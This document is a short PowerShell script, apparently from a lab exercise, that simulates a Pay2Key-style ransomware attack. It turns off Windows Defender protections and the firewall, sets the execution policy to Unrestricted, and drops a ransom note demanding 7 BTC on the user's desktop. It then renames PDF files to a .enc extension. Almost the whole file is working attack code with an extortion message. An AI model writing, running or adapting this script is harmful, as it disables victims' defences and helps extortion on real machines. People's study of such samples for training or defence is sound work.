# This code will turn off all of Windows Defender+
Set-MpPreference -DisableIntrusionPreventionSystem $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableScriptScanning $true;
Set-MpPreference -EnableControlledFolderAccess Disabled;

#This section will turn off the firewall
netsh advfirewall set currentprofile state off

# This will change the execution policy of the current user so you are able to run the script
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope currentUser

# This will create the ransomware message on the desktop of the victim under the name "SALAM_MESSAGE"
"PAY2KEY `n`nHELLO ORGANIZATION USERS `n`nCongratulations! `nYour entire network and all your informations such as computers/ employees information/ users folders/ servers/ file-servers/ `napplications/ databases/etc... in your network has been successfully encrypted! `nSome of your important information dumped and ready to leak, in case we can't make a good deal! `n`nDon't modify encrypted files or you can damage them and decryption will be impossible! `nDon't try unoffical decryptors to recover your files or you can damage them and decryption will be impossible! `n`nThere is only ONE possible way to get back your files! Pay and contact to receive your special decryptor! `nYou should pay 7 BTC to receive offical decryptor and easily recover your files. `nYour special decryptor is now ready and `nwaiting for your payment, let's do it! `n`nYou can send 4 radom file from any computers and receive decrypted data, just as proof that works! `nYour UserID IS: [USERID] `nYour Network ID: [NETWORKID] `n`n|NOTICE| `nOffer available until day/month/year. If you do not pay on time, price will be doubled! `n`nWallet: [WALLET] `nE-mail: `npay2key@tuta.io `npay2key@pm.me `n`nKeybase: `nPay2Key" | Out-File -FilePath C:\Users\champuser\Desktop\SALAM_MESSAGE.txt

# This will look for .pdf files in the Documents folder and change the file extension to .enc
get-childitem C:\Users\champuser\Documents -Filter "*pdf*" -Recurse | rename-item -NewName {$_.name -replace 'pdf','enc' }